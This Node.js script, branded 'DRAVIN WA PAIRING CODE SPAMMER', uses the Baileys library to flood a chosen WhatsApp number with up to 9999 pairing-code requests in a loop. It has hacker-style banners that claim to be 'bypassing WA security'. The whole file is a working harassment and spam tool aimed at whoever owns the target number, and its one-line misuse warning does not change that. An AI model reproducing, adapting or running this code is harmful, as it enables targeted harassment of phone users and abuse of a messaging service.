const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const gradient = require('gradient-string');
const chalk = require('chalk');
const figlet = require('figlet');

// Extreme Visuals
const cyberTheme = gradient('cyan', 'purple', 'red');
const errorTheme = gradient('red', 'orange');
const successTheme = gradient('green', 'lime');
const warningTheme = gradient('yellow', 'orange');

const showBanner = () => {
    console.clear();
    console.log(cyberTheme(figlet.textSync('DRAVIN SPAM', { 
        font: 'Bloody',
        horizontalLayout: 'full',
        verticalLayout: 'default'
    })));

    console.log(cyberTheme("╔══════════════════════════════════════════════════════════╗"));
    console.log(cyberTheme(`║ ${chalk.bold.white("DRAVIN WA PAIRING CODE SPAMMER")} ${chalk.red("v2.0")}             ║`));
    console.log(cyberTheme("╚══════════════════════════════════════════════════════════╝"));
    console.log(warningTheme("  █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█"));
    console.log(warningTheme(`  █ ${chalk.white("WARNING:")} ${chalk.red("Jangan di salah gunakan")}          █`));
    console.log(warningTheme("  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n"));
};

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function initBot() {
    const { state } = await useMultiFileAuthState('./dravin_session');
    return makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 30000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        browser: ["DRAVIN-SPAM", "Chrome", "666.0.0"],
        getMessage: async () => ({
            conversation: "DRAVIN SPAM TOOL ACTIVATED"
        })
    });
}

async function nuclearSpam(bot) {
    while (true) {
        console.log(cyberTheme("\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"));
        const phoneNumber = await question(cyberTheme(`\n[${chalk.red('☢')}] ${chalk.white("TARGET NUMBER")} ${chalk.yellow('(62xxxxxxxxxx)')}: `));
        
        if (!phoneNumber.startsWith('62') || phoneNumber.length < 10) {
            console.log(errorTheme(`\n[${chalk.white('✖')}] ${chalk.bold("INVALID NUMBER! MUST START WITH 62")}`));
            continue;
        }

        const spamCount = parseInt(await question(cyberTheme(`[${chalk.red('☢')}] ${chalk.white("PAIRING SPAM COUNT")} ${chalk.yellow('(1-9999)')}: `)));
        if (isNaN(spamCount) || spamCount <= 0 || spamCount > 9999) {
            console.log(errorTheme(`\n[${chalk.white('✖')}] ${chalk.bold("INVALID COUNT! MUST BE 1-9999")}`));
            continue;
        }

        console.log(cyberTheme("\n▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"));
        console.log(successTheme(`\n[${chalk.white('☣')}] ${chalk.bold("LAUNCHING PAIRING SPAM TO")} ${chalk.red(phoneNumber)}`));
        console.log(successTheme(`[${chalk.white('☣')}] ${chalk.bold("TOTAL PAYLOAD:")} ${chalk.red(spamCount)}`));
        console.log(cyberTheme("▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄"));

        let successCount = 0;
        for (let i = 0; i < spamCount; i++) {
            try {
                const startTime = Date.now();
                let code = await bot.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join(chalk.red('-')) || code;
                const elapsedTime = (Date.now() - startTime) / 1000;
                
                successCount++;
                console.log(successTheme(`\n[${chalk.white('✓')}] ${chalk.bold("SPAM SUCCESS")} ${chalk.white('→')} ${chalk.yellow(`[${i+1}/${spamCount}]`)}`));
                console.log(successTheme(`   ${chalk.white('├─')} ${chalk.bold("CODE:")} ${chalk.red(code)}`));
                console.log(successTheme(`   ${chalk.white('└─')} ${chalk.bold("TIME:")} ${chalk.cyan(`${elapsedTime.toFixed(2)}s`)}`));
                
                // Add dramatic delay for effect
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                console.log(errorTheme(`\n[${chalk.white('✖')}] ${chalk.bold("SPAM FAILED")} ${chalk.white('→')} ${chalk.yellow(`[${i+1}/${spamCount}]`)}`));
                console.log(errorTheme(`   ${chalk.white('└─')} ${chalk.bold("ERROR:")} ${chalk.red(error.message)}`));
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        console.log(cyberTheme("\n▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀"));
        console.log(successTheme(`\n[${chalk.white('☢')}] ${chalk.bold("MISSION SUMMARY")}`));
        console.log(successTheme(`   ${chalk.white('├─')} ${chalk.bold("TARGET:")} ${chalk.red(phoneNumber)}`));
        console.log(successTheme(`   ${chalk.white('├─')} ${chalk.bold("ATTEMPTS:")} ${chalk.yellow(spamCount)}`));
        console.log(successTheme(`   ${chalk.white('├─')} ${chalk.bold("SUCCESS:")} ${chalk.green(successCount)}`));
        console.log(successTheme(`   ${chalk.white('└─')} ${chalk.bold("FAILED:")} ${chalk.red(spamCount - successCount)}`));

        const continueOption = await question(cyberTheme(`\n[${chalk.red('?')}] ${chalk.white("CONTINUE SPAMMING?")} ${chalk.yellow('(y/n)')}: `));
        if (continueOption.toLowerCase() !== 'y') {
            console.log(cyberTheme("\n[+] THANK YOU FOR USING DRAVIN SPAM TOOL"));
            console.log(cyberTheme("[+] POWERED BY DRAVIN\n"));
            break;
        }
    }
}

async function main() {
    showBanner();
    try {
        console.log(cyberTheme("\n[+] INITIALIZING DRAVIN SPAM PAIRING..."));
        const bot = await initBot();
        console.log(successTheme("[✓] TOOLS INITIALIZED SUCCESSFULLY"));
        await nuclearSpam(bot);
    } catch (error) {
        console.log(errorTheme(`\n[✖] FATAL ERROR: ${error.message}`));
    } finally {
        process.exit(0);
    }
}

// Run with epic intro
console.clear();
setTimeout(() => {
    console.log(cyberTheme("\n[+] ACTIVATING CYBER WEAPONS..."));
    setTimeout(() => {
        console.log(warningTheme("[!] BYPASSING WA SECURITY PROTOCOLS..."));
        setTimeout(main, 1500);
    }, 1500);
}, 500);
